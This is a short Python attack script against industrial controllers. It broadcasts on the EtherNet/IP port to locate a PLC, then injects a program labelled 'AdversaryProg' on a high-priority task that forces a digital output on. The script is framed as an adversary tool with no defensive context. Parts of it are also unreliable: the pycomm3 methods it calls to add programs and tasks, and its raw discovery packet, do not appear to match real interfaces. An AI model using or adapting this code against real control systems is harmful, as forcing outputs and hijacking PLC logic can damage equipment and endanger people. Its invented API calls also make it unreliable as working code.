import pycomm3
import socket
import time

# Function to find the IP address of the PLC
def find_plc_ip():
    # Define the broadcast address and port
    broadcast_address = '255.255.255.255'
    port = 44818  # Common port for EtherNet/IP

    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    # Send a broadcast message to discover the PLC
    discovery_message = b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    sock.sendto(discovery_message, (broadcast_address, port))

    # Receive the response
    sock.settimeout(5)
    try:
        data, addr = sock.recvfrom(1024)
        print(f"PLC found at IP address: {addr[0]}")
        return addr[0]
    except socket.timeout:
        print("No PLC found")
        return None

# Function to modify the tasking of the PLC
def modify_plc_tasking(plc_ip):
    # Create a PLC object
    plc = pycomm3.LogixDriver(plc_ip)

    try:
        # Open the connection to the PLC
        plc.open()

        # Define the new program to be added to the task
        new_program = """
        PROGRAM AdversaryProg
            // Adversary logic
            _IO_EM_DO_08 := TRUE;  // Example: Turn on an output
        END_PROGRAM
        """

        # Add the new program to the PLC
        plc.add_program('AdversaryProg', new_program)

        # Define the task properties
        task_name = 'AdversaryTask'
        task_interval = 1000  # 1 second interval
        task_priority = 10  # High priority

        # Add the task to the PLC
        plc.add_task(task_name, task_interval, task_priority)

        # Associate the program with the task
        plc.add_task_program(task_name, 'AdversaryProg')

        print(f"Task '{task_name}' with program 'AdversaryProg' added successfully.")
    except Exception as e:
        print(f"Error modifying PLC tasking: {e}")
    finally:
        # Close the connection to the PLC
        plc.close()

# Main function
def main():
    # Find the PLC IP address
    plc_ip = find_plc_ip()
    if plc_ip:
        # Modify the PLC tasking
        modify_plc_tasking(plc_ip)

if __name__ == "__main__":
    main()